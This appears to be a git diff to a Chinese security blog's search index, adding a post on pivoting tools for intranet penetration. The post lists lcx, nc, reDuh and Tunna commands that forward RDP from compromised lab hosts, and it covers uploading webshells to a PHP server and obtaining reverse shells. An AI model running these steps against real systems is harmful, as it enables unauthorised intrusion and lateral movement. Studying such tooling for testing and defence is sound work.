@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title><![CDATA[内网渗透中转发工具总结]]></title>
+      <url>http://uknowsec.cn/posts/notes/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html</url>
+      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="LCX转发"><a href="#LCX转发" class="headerlink" title="LCX转发"></a>LCX转发</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
+<p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>
+<p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
+<p>首先在本地进行监听，监听51端口并转发到33891端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe -listen 51 33891</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx1.png" alt=""></p>
+<p>内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p>
+<p>将内网(192.168.1.128)的3389端口转发到公网(192.168.1.110)的51端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe –slave 192.168.1.110 51 192.168.1.128 3389</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx2.png" alt=""></p>
+<p>远程桌面访问33891端口</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx3.png" alt=""></p>
+<h2 id="NC转发"><a href="#NC转发" class="headerlink" title="NC转发"></a>NC转发</h2><p>本机：192.168.1.125<br>靶机：192.168.1.128</p>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>在靶机上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc1.png" alt=""></p>
+<p>在本机上操作，并成功获得一个远程机器的shell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc2.png" alt=""></p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>在本机运行上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc3.png" alt=""></p>
+<p>在远程机器上，然后成功之后，在本地机器上获得一个远程机器的cmdshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc4.png" alt=""></p>
+<h2 id="Redduh内网反弹"><a href="#Redduh内网反弹" class="headerlink" title="Redduh内网反弹"></a>Redduh内网反弹</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
+<p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。</p>
+<p>这里我们以php网站为例，首先将php文件上传到服务器端。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh1.png" alt=""></p>
+<p>浏览器中访问上传的webshell，提示以下内容说明解析成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh2.png" alt=""></p>
+<p>用客户端连接服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar reDuhClient.jar http://192.168.1.125/reDuh.php</div></pre></td></tr></table></figure></p>
+<p>本地连接1010端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc.exe -vv localhost 1010</div><div class="line">[createTunnel]1235:127.0.0.1:3389</div></pre></td></tr></table></figure></p>
+<p>远程登录<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
+<h2 id="Tunna内网反弹"><a href="#Tunna内网反弹" class="headerlink" title="Tunna内网反弹"></a>Tunna内网反弹</h2><p>靶机：192.168.1.137<br>本机：192.168.1.110</p>
+<p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna0.png" alt=""></p>
+<p>这里使用php网站进行测试，上传php后门<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python proxy.py -u http://192.168.1.137/conn.php -l 1234 -r 3389 -v –s</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/tunna4.png" alt=""></p>
+<p>远程连接<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[xss payload 大全]]></title>
       <url>http://uknowsec.cn/posts/notes/xss-payload-%E5%A4%A7%E5%85%A8.html</url>
       <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
